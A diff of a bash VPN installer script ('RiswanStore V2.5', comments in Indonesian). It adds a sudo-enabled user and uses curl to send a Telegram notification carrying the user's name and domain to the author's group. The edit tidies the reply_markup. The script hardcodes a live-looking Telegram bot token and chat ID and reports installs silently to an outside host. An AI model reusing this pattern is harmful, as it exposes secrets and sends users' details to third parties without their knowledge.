@@ -172,11 +172,11 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="-1002029496202"  # Ganti dengan ID grup Telegram Anda
-KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Ganti dengan token bot Anda
-TIME="10"
+CHATID="-1002029496202"  # ID grup Telegram Anda
+KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Token bot Anda
+TIME="10"  # Timeout maksimal untuk curl
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Script RiswanStore. V2.5
+TEXT="Script Vpn RiswanStore. V2.5
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <code>Pengguna :</code> <code>$Name</code>
 <code>Domain   :</code> <code>$domain</code>
@@ -188,10 +188,13 @@ TEXT="Script RiswanStore. V2.5
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Dikelola oleh Admin @RiswanJabar
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>Notifikasi Otomatis Dari Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/RiswanJabar"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
+<i>Notifikasi Otomatis Dari Github</i>"
 
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+# Format tombol inline keyboard untuk kontak
+reply_markup='{"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/RiswanJabar"},{"text":"Contact","url":"https://wa.me/6285888801241"}]]}'
+
+# Kirim notifikasi ke grup Telegram
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html&reply_markup=$reply_markup" $URL >/dev/null
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
